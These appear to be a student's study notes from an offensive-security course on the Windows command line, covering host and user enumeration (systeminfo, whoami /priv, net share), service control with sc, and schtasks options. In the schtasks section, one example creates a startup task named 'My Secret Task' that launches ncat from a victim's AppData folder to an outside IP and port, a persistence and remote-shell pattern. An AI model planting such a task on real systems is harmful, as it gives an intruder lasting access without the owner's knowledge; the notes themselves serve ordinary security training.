![[Pasted image 20250509104609.png]]
As we can see from the diagram above, the types of information that we would be looking for can be broken down into the following categories:

| Type                         | Description                                                                                                                                                                                                                                                                                                                                              |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `General System Information` | Contains information about the overall target system. Target system information includes but is not limited to the `hostname` of the machine, OS-specific details (`name`, `version`, `configuration`, etc.), and `installed hotfixes/patches` for the system.                                                                                           |
| `Networking Information`     | Contains networking and connection information for the target system and system(s) to which the target is connected over the network. Examples of networking information include but are not limited to the following: `host IP address`, `available network interfaces`, `accessible subnets`, `DNS server(s)`, `known hosts`, and `network resources`. |
| `Basic Domain Information`   | Contains Active Directory information regarding the domain to which the target system is connected.                                                                                                                                                                                                                                                      |
| `User Information`           | Contains information regarding local users and groups on the target system. This can typically be expanded to contain anything accessible to these accounts, such as `environment variables`, `currently running tasks`, `scheduled tasks`, and `known services`.                                                                                        |

## Why Do We Need This Information?
- What user account do we have access to?
- What groups does our user belong to?
- What current working set of privileges does our user have access to?
- What resources can our user access over the network?
- What tasks and services are running under our user account?

## How Do We Get This Information?
* Casting a Wide Net
	*  Systeminfo
	* hostname
	* ver
* Scoping the Network
	* Ipconfig
	* arp /a
* Understanding Our Current User
	* whoami /all
	* whoami /groups
	* whoami /priv
```cmd
C:\Users\andre>whoami /priv                                                                                                                                   PRIVILEGES INFORMATION                                                           ----------------------                                                                                                                                       Privilege Name                Description                          State ============================= ==================================== ======== SeLockMemoryPrivilege         Lock pages in memory                 Disabled SeShutdownPrivilege           Shut down the system                 Disabled SeChangeNotifyPrivilege       Bypass traverse checking             Enabled SeUndockPrivilege             Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled SeTimeZonePrivilege           Change the time zone                 Disabled
```
* Investigating Other Users/Groups
	* Net User
	* Net Group (Domain Controller only)
	* Net Localgroup
* Exploring Resources on the Network
	* Net Share
		* Do we have the proper permissions to access this share?
		- Can we read, write, and execute files on the share?
		- Is there any valuable data on the share?
	* Net view
* Searching With CMD
	* Where (Only looks through the PATH)
	* Where /R (Recursively looks through the PATH unless a directory has been specified)
	* Where example `where /R C:\Users\student\ *.csv`
	* Find example (find /N /I /V "IP Address" example.txt) (/V = NOT | /N = Line number | /I = ignore case sensitivity)
	* findstr (It will look for anything matching a pattern, regex value, wildcards, and more.)
* Evaluating and Sorting Files
	* comp
	* fc
	* sort
	* sort /unique

### Managing Services
1. `sc` - Service Controller
	* `sc query type= service`
	* `sc start` 
	* `sc stop`
	* `sc config`
	* `sc config bits start= disabled`
	* To revert everything back to normal, you can set start= auto
2. `Tasklist /svc`
3. `net start`, `net stop`, `net pause`, and `net continue` behave very similarly to `sc`
4. `wmic service list brief`

### Triggers That Can Kick Off a Scheduled Task
- When a specific system event occurs.
- At a specific time.
- At a specific time on a daily schedule.
- At a specific time on a weekly schedule.
- At a specific time on a monthly schedule.
- At a specific time on a monthly day-of-week schedule.
- When the computer enters an idle state.
- When the task is registered.
- When the system is booted.
- When a user logs on.
- When a Terminal Server session changes state.
##### `schtasks`
|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Query`||Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.|
||/fo|Sets formatting options. We can specify to show results in the `Table, List, or CSV` output.|
||/v|Sets verbosity to on, displaying the `advanced properties` set in displayed tasks when used with the List or CSV output parameter.|
||/nh|Simplifies the output using the Table or CSV output format. This switch `removes` the `column headers`.|
||/s|Sets the DNS name or IP address of the host we want to connect to. `Localhost` is the `default` specified. If `/s` is utilized, we are connecting to a remote host and must format it as "\\host".|
||/u|This switch will tell schtasks to run the following command with the `permission set` of the `user` specified.|
||/p|Sets the `password` in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The `u` and `p` values are only valid when used with the `s` parameter.|
We can view the tasks that already exist on our host by utilizing the `schtasks` command like so:
`SCHTASKS /Query /V /FO list`

| **Action** | **Parameter** | **Description**                                                                                                               |
| ---------- | ------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| `Create`   |               | Schedules a task to run.                                                                                                      |
|            | /sc           | Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.      |
|            | /tn           | Sets the name for the task we are building. Each task must have a unique name.                                                |
|            | /tr           | Sets the trigger and task that should be run. This can be an executable, script, or batch file.                               |
|            | /s            | Specify the host to run on, much like in Query.                                                                               |
|            | /u            | Specifies the local user or domain user to utilize                                                                            |
|            | /p            | Sets the Password of the user-specified.                                                                                      |
|            | /mo           | Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.                       |
|            | /rl           | Allows us to limit the privileges of the task. Options here are `limited` access and `Highest`. Limited is the default value. |
|            | /z            | Will set the task to be deleted after completion of its actions.                                                              |
Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following:

- `/create` : to tell it what we are doing
- `/sc` : we must set a schedule
- `/tn` : we must set the name
- `/tr` : we must give it an action to take

Example
```cmd-session
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Change`||Allows for modifying existing scheduled tasks.|
||/tn|Designates the task to change|
||/tr|Modifies the program or action that the task runs.|
||/ENABLE|Change the state of the task to Enabled.|
||/DISABLE|Change the state of the task to Disabled.|
```cmd-session
# To see if the changes stuck
schtasks /query /tn "My Secret Task" /V /fo list 
```
* We can use the `/run` parameter to kick the task off immediately.

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Delete`||Remove a task from the schedule|
||/tn|Identifies the task to delete.|
||/s|Specifies the name or IP address to delete the task from.|
||/u|Specifies the user to run the task as.|
||/p|Specifies the password to run the task as.|
||/f|Stops the confirmation warning.|
`schtasks /delete  /tn "My Secret Task" `
